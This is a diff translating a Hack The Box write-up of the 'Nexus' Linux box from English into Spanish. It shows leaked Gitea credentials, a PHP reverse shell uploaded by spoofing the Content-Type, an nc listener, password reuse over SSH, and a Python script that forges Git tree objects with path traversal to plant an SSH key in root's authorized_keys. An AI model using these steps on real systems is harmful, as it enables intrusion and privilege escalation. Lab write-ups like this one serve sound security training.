@@ -1,11 +1,11 @@
 ---
 created: 2026-7-13
-description: Nexus is an easy Linux box featuring a Gitea instance that exposes repository configuration files and historical credentials, leading to access to a Krayin CRM dashboard vulnerable to CVE-2026-38526. The foothold is obtained through an unrestricted PHP file upload, followed by credential reuse to gain SSH access as jones. Privilege escalation involves abusing a root-owned systemd timer that synchronizes Gitea template repositories, exploiting unsanitized Git tree paths to write an SSH public key into /root/.ssh/authorized_keys.
+description: Nexus es una máquina Linux fácil que cuenta con una instancia de Gitea que expone archivos de configuración del repositorio y credenciales históricas, lo que conduce al acceso a un panel de Krayin CRM vulnerable a CVE-2026-38526. El acceso inicial se obtiene mediante una subida de archivos PHP sin restricciones, seguida de la reutilización de credenciales para obtener acceso SSH como jones. La escalada de privilegios implica abusar de un temporizador de systemd propiedad de root que sincroniza repositorios de plantillas de Gitea, explotando rutas del árbol de Git no saneadas para escribir una clave pública SSH en /root/.ssh/authorized_keys.
 ---
 
 #htb #easy #linux #web #subdomains #gitea #env-leak #credentials-reuse #krayin #cve-2026-38526 #file-upload #systemd-timers #git #path-traversal
 
-# Enumeration
+# Enumeración
 ## Nmap
 
 ```bash
@@ -15,7 +15,7 @@ Discovered open port 22/tcp on 10.129.234.54
 Discovered open port 80/tcp on 10.129.234.54
 ```
 
-Open ports: 22,80
+Puertos abiertos: 22,80
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/n/scan
@@ -26,7 +26,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://nexus.htb/
 ```
 
-## Subdomains
+## Subdominios
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/n/scan
@@ -35,68 +35,68 @@ git                     [Status: 200, Size: 14472]
 billing                 [Status: 302, Size: 390]
 ```
 
-Add `nexus.htb`, `git.nexus.htb` and `billing.nexus.htb` to `/etc/hosts`.
+Añadir `nexus.htb`, `git.nexus.htb` y `billing.nexus.htb` a `/etc/hosts`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/n/scan
 ❯ echo "10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
 ```
 
-The job posting of `nexus.htb` displays two email addresses.
+La oferta de empleo de `nexus.htb` muestra dos direcciones de correo electrónico.
 - `j.matthew@nexus.htb`
 - `careers@nexus.htb`
 
-`git.nexus.htb` contains a repository named `krayin-docker-setup` which exposes the `.env` file, where we can find the other subdomain and a password.
+`git.nexus.htb` contiene un repositorio llamado `krayin-docker-setup` que expone el archivo `.env`, donde podemos encontrar el otro subdominio y una contraseña.
 ```txt
 APP_URL=http://billing.nexus.htb
 ```
 
-Inspecting the commit history reveals  that the database password has been removed.
+Al inspeccionar el historial de commits se revela que la contraseña de la base de datos había sido eliminada.
 ```txt
 DB_PASSWORD=N27xh!!2ucY04
 ```
 
 ## Krayin
 
-The `billing.nexus.htb` subdomain displays a login page which can be accessed using the email address found in `nexus.htb` and the password of the `.env` file.
+El subdominio `billing.nexus.htb` muestra una página de inicio de sesión a la que se puede acceder usando la dirección de correo electrónico encontrada en `nexus.htb` y la contraseña del archivo `.env`.
 ```txt
 User: j.matthew@nexus.htb
 Password: N27xh!!2ucY04
 ```
 
-The **Krayin** dashboard displays the version 2.2.0 which is vulnerable to unrestricted PHP file upload ([CVE-2026-38526](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md)).
+El panel de **Krayin** muestra la versión 2.2.0, que es vulnerable a una subida de archivos PHP sin restricciones ([CVE-2026-38526](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md)).
 
-# Exploitation
-## Gaining a shell
+# Explotación
+## Obtención de una shell
 
-The vulnerability allows authenticated users to upload arbitrary PHP files by bypassing the file type validation.
+La vulnerabilidad permite a usuarios autenticados subir archivos PHP arbitrarios eludiendo la validación del tipo de archivo.
 
-Compose a new email in the email page. Then click the attachment button and select a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
+Redactar un nuevo correo en la página de email. Luego, hacer clic en el botón de adjuntos y seleccionar una [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
 ![](mail_panel.png)
 
-Intercept the request with **Burp Suite** and change the `Content-Type` to `image/jpeg` and send the request.
+Interceptar la petición con **Burp Suite**, cambiar el `Content-Type` a `image/jpeg` y enviar la petición.
 ![](burp_shell_upload.png)
 
-Start a listener.
+Iniciar un listener.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/n/content
 ❯ nc -lnvp 4444
 ```
 
-Send a GET request to the uploaded file URL.
+Enviar una petición GET a la URL del archivo subido.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/n/content
 ❯ curl http:\/\/billing.nexus.htb\/storage\/emails\/8\/shell.php
 ```
 
-## Post-Exploitation
+## Post-explotación
 
-The `.env` file contains plain-text credentials.
+El archivo `.env` contiene credenciales en texto plano.
 ```bash
 $ cat /var/www/krayin/.env
 DB_PASSWORD=y27xb3ha!!74GbR
 ```
 
-Search for users who can reuse the password.
+Buscar usuarios que puedan reutilizar la contraseña.
 ```bash
 $ cat /etc/passwd | grep bash
 root:/bin/bash
@@ -104,30 +104,30 @@ jones:/home/jones:/bin/bash
 git:/home/git:/bin/bash
 ```
 
-Connect as the user `jones` with the found password.
+Conectarse como el usuario `jones` con la contraseña encontrada.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/n/content
 ❯ ssh jones@nexus.htb
 jones@nexus.htb's password:
 ```
 
-Read the user flag.
+Leer la flag de usuario.
 ```bash
 jones@nexus:~$ cat user.txt
 ```
 
-# Privilege escalation
+# Escalada de privilegios
 
-## Enumeration
+## Enumeración
 
-List the `systemd` timers.
+Listar los temporizadores de `systemd`.
 ```bash
 jones@nexus:~$ systemctl list-timers
 ACTIVATES
 gitea-template-sync.service
 ```
 
-Inspect the associated service.
+Inspeccionar el servicio asociado.
 ```bash
 jones@nexus:~$ cat /etc/systemd/system/gitea-template-sync.service
 [Unit]
@@ -141,23 +141,23 @@ ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
 TimeoutStartSec=50s
 ```
 
-Check the Python script permissions.
+Comprobar los permisos del script de Python.
 ```bash
 jones@nexus:~$ ls -l /etc/gitea/template-sync.py
 -rw-r--r-- 1 git git 4184 May 11 18:47 /etc/gitea/template-sync.py
 ```
 
-The timer executes a Python script as root which is not writable.
+El temporizador ejecuta un script de Python como root que no es escribible.
 
-## Exploitation
+## Explotación
 
-The Python script enumerates all template repositories in the Gitea application. For each repository, it reads the Git tree and writes the contents of each blob to `/home/git/template-staging/<owner>/<name>`.
+El script de Python enumera todos los repositorios de plantillas en la aplicación Gitea. Para cada repositorio, lee el árbol de Git y escribe el contenido de cada blob en `/home/git/template-staging/<owner>/<name>`.
 
-The script never sanitizes blob paths before writing them to disk. So if a repository contains tree entries with path traversal components (`../`), files can be written outside the staging directory, for example to `/root/.ssh/authorized_keys`.
+El script nunca sanea las rutas de los blobs antes de escribirlos en disco. Por lo tanto, si un repositorio contiene entradas de árbol con componentes de path traversal (`../`), se pueden escribir archivos fuera del directorio de staging, por ejemplo en `/root/.ssh/authorized_keys`.
 
-However, Git prevents creating tree entries with path traversal components through its normal commands. To bypass this restriction, we must write the crafted Git objects directly to `.git/objects`.
+Sin embargo, Git impide crear entradas de árbol con componentes de path traversal mediante sus comandos normales. Para eludir esta restricción, debemos escribir directamente los objetos Git manipulados en `.git/objects`.
 
->[!note]- Relevant code
+>[!note]- Código relevante
 >```python
 >result = subprocess.run(
 >	GIT + ['ls-tree', '-r', 'HEAD'],
@@ -184,21 +184,21 @@ However, Git prevents creating tree entries with path traversal components throu
 >		f.write(cat_result.stdout) # writes the file content in the target path
 >```
 
-### Malicious Template Repository
+### Repositorio de plantilla malicioso
 
-Log in to `http://git.nexus.htb/` with the SSH credentials and create a template repository.
+Iniciar sesión en `http://git.nexus.htb/` con las credenciales SSH y crear un repositorio de plantilla.
 ![](template_repo.png)
-Create a local repository.
+Crear un repositorio local.
 ```bash
 jones@nexus:/tmp$ mkdir rce && cd rce && git init
 ```
 
-Create a SSH key for the `jones` user.
+Crear una clave SSH para el usuario `jones`.
 ```bash
 jones@nexus:/tmp$ ssh-keygen -t ed25519 -f /tmp/malicious_key -N ""
 ```
 
-Create a crafted Git tree object named `../../../../../root/.ssh/authorized_keys` containing jones's SSH public key using the following Python script.
+Crear un objeto de árbol Git manipulado llamado `../../../../../root/.ssh/authorized_keys` que contenga la clave pública SSH de jones usando el siguiente script de Python.
 ```python
 #!/usr/bin/env python3
 import hashlib,zlib,os,subprocess,sys,time
@@ -249,13 +249,13 @@ open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
 print("Done")
 ```
 
-Execute the script.
+Ejecutar el script.
 ```bash
 jones@nexus:/tmp/rce$ python3 script.py ../malicious_key.pub 
 Done
 ```
 
-Push the crafted commit to the template repository.
+Subir el commit manipulado al repositorio de plantilla.
 ```bash
 jones@nexus:/tmp/rce$ git remote add origin http://localhost:3000/jones/rce.git
 
@@ -264,7 +264,7 @@ Username for 'http://localhost:3000': jones
 Password for 'http://jones@localhost:3000': y27xb3ha!!74GbR
 ```
 
-Wait for the timer to execute and verify the exploit.
+Esperar a que el temporizador se ejecute y verificar el exploit.
 ```bash
 jones@nexus:/tmp/rce$ tail -f /var/log/template-sync.log
 [2026-07-12 11:56:48] Template sync starting
@@ -273,12 +273,12 @@ jones@nexus:/tmp/rce$ tail -f /var/log/template-sync.log
 [2026-07-12 11:58:48] Template sync complete
 ```
 
-Login as root via ssh.
+Iniciar sesión como root mediante ssh.
 ```bash
 jones@nexus:/tmp/rce$ ssh -i /tmp/malicious_key root@localhost
 ```
 
-Read the root flag.
+Leer la flag de root.
 ```bash
 root@nexus:~$ cat /root/root.txt
 ```
